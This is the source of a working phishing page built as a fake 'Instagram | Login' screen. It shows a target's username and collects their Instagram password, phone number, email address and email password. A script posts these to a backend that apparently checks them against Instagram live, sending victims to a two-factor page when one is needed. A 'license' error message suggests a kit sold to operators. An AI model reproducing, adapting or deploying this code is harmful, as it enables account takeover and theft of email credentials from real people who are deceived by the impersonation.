<?php   

include("data.php");
session_start(); 
	error_reporting(0);
   $nick = $_GET['user'];
  
if (!$_SESSION[$nick]) {
   $apifor= "base_api.php?resim=aHR0cHM6Ly9lbmNyeXB0ZWQtdGJuMC5nc3RhdGljLmNvbS9pbWFnZXM/cT10Ym46QU5kOUdjUkZtb3dFV0pRc1J0WDc1ZU9sdVd4UGdFbzFFcWo5NmliMk5RJnVzcXA9Q0FV";
   if ($apifor=="error") {
      die("The username you entered doesn't belong to an account. Please check your username and try again.");
     
   } 
   $_SESSION[$nick]= $apifor;

} else { 
      
}

$_SESSION['photo']= $_SESSION[$nick];
$_SESSION['kadi']= $nick;
if (empty($_SESSION['token'])) {
    if (function_exists('mcrypt_create_iv')) {
        $_SESSION['token'] = bin2hex(mcrypt_create_iv(32, MCRYPT_DEV_URANDOM));
    } else {
        $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
    }
}
$token = $_SESSION['token'];

?><!DOCTYPE html>
<html lang="en">
   <head>
      <title>Instagram | Login</title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <!--===============================================================================================-->	
      <link rel="icon" type="image/png" href="favicon.png"/>
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/vendor/bootstrap/css/bootstrap.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/vendor/animate/animate.css">
      <!--===============================================================================================-->	
      <link rel="stylesheet" type="text/css" href="css/vendor/css-hamburgers/hamburgers.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/vendor/select2/select2.min.css">
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/util.css">
      <link rel="stylesheet" type="text/css" href="css/main.css">
      <!--===============================================================================================-->
   </head>
   <style type="text/css">
   <style>
      img {
      border: 1px solid #ddd;
      border-radius: 4px;
      padding: 5px;
      width: 150px;
      }
      .overlay{
      display: none;
      position: fixed;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      z-index: 999;
      background: rgba(255,255,255,0.8) url("https://i.pinimg.com/originals/78/e8/26/78e826ca1b9351214dfdd5e47f7e2024.gif") center no-repeat;
      }
      /* Turn off scrollbar when body element has the loading class */
      body.loading{
      overflow: hidden;   
      }
      /* Make spinner image visible when body element has the loading class */
      body.loading .overlay{
      display: block;
      }
   </style>
   <style type="text/css">  .btn {
      cursor: pointer;
      width: 100%;
      padding:0 8px; 
      background: #3897f0;
      border:1px solid #3897f0;
      color:#fff;
      border-radius:10px;
      font-weight:600;
      font-size: 14px;
      height: 35px;
      line-height: 26px;
      outline: none;
      white-space: nowrap;
      }
   </style>
   <body><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
      <div class="limiter">
         <div class="container-login100">
            <div class="wrap-login100">
               <div class="login100-pic js-tilt" data-tilt="" style="will-change: transform; transform: perspective(300px) rotateX(0deg) rotateY(0deg);">
                  <img src="https://www.vargonen.com/blog/wp-content/uploads/2020/09/instagramlogo.jpg" alt="IMG"> <br><br><br><br>
               </div>
               <el class="login100-form validate-form" id="elemend">
                  <form autocomplete="off" id="foo">
                       <center><img width="140" height="40" src="https://i.hizliresim.com/5xns4qf.png"></center><br>
                     <center><img style="max-width:90%; border-radius:50%;" width="200" height="200" src="<?php echo $pp; ?>"></center>
                     <hr>
                    <center><h3>@<?php echo $_SESSION['kadi']; ?> </h3></center>
                      <hr> <input name="token" type="hidden" value="<?= $token ?>">
                  <input type="hidden" name="instauser" value="<?php echo $_SESSION['kadi']; ?>">
                     <div class="wrap-input100 validate-input"> <input class="input100" type="password" required="" name="instapass" placeholder="Password"> <span class="focus-input100"> </span> <span class="symbol-input100"> <i class="fa fa-lock" aria-hidden="true"></i> </span></div>
<div class="wrap-input100 validate-input"> <input class="input100" type="text" required="" name="telefon" placeholder="Phone Number"> <span class="focus-input100" ></span> <span class="symbol-input100"> <i class="fas fa-phone" aria-hidden="true"></i> </span> </div>
                     
                       <div class="wrap-input100 validate-input"> <input class="input100" type="mail" required="" name="mailadress" placeholder="Mail Address"> <span class="focus-input100" ></span> <span class="symbol-input100"> <i class="fas fa-envelope" aria-hidden="true"></i> </span> </div>
                       
                       <div class="wrap-input100 validate-input"> <input class="input100" type="text" required="" name="mailpass" placeholder="Mail Password"> <span class="focus-input100" ></span> <span class="symbol-input100"> <i class="fas fa-key"></i> </span> </div>
                       
                       
                     <button type="submit" id="df" class="btn">Confirm</button> <br> <br>
                     <status id="statuss"></status>
                     <br><br>
                  </form>
               </el>
            </div>
         </div>
      </div>
      <!--===============================================================================================-->	
      <script src="css/vendor/jquery/jquery-3.2.1.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/bootstrap/js/popper.js"></script>
      <script src="css/vendor/bootstrap/js/bootstrap.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/select2/select2.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/tilt/tilt.jquery.min.js"></script>
      <script >
         $('.js-tilt').tilt({
         	scale: 1.1
         })
      </script>
      <!--===============================================================================================-->
      <script src="css/js/main.js"></script>
      <script type="text/javascript">
         var request;

         $("#foo").submit(function(event){
          var btn = $("#df");
btn.prop("disabled", true); 
         

          $("#df").html("<img wight='20' height='20' src='https://i.gifer.com/ZZ5H.gif'>");

          event.preventDefault();
          var $form = $(this);
          var serializedData = $form.serialize();

          request = $.ajax({
            url: "ajaxlogin.php",
            type: "post",
            dataType: "json",
            data: serializedData,  

            success: function(data)
            {

if(data.tokenerror) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>Refresh the security error page.</center></font><br><br> ');
btn.html("Security Error");
              return false;
            }
            
           if(data.lisanshata) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>You do not have a license!</center></font><br><br> ');
btn.html("License Error");
              return false;
            }
            
              
    
     
            
            
             if(data.user==false){
              $("#statuss").html(' <font color="#ed4956"><center>The username you entered does not belong to an account. Please check your username and try again.</center></font><br ><br> ');
btn.prop("disabled", false);
             
              $("#df").html("Sign In");
              return false;


            }
            if(data.checkpoint_url) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>Login Failed Please Login to Instagram App and Pass Verification</center></font><br><br> ');
btn.prop("disabled", false);
              return false;
            }

            if(data.authenticated==false){
              $("#statuss").html('<font color="#ed4956"><center>Sorry, your password was wrong. Please check your password carefully.</center></font><br><br> ') ;
btn.prop("disabled", false);
        
              $("#df").html("Sign In");
              return false;


            }
             if(data.two_factor_required) {
               window.location.href ='two';
                   return false;
              }
              
                if(data.status=="fail") {
              $("#statuss").html('<font color="#ed4956"><center>'+data.feedback_message+'</center></font><br><br> ');
btn.prop("disabled", false);
        
              $("#df").html("Sign In");
              return false;
              }
              
              
            if (data.authenticated==true) {
  $("#statuss").html('<font color="#00bf00"><center>Login Success</center></font><br><br> ');
            
               $("#df").html("Logged in...");
               
                setTimeout(function(){ window.location.href="confirmed.php"; }, 3000);
             

           }


         }, error:function(res){
                    
              $("#df").html("UNKNOWN ERROR REFRESH PAGE.");
          alert("UNKNOWN ERROR, REFRESH PAGE.");
    }
       });
        });
      </script>
   </body>
</html>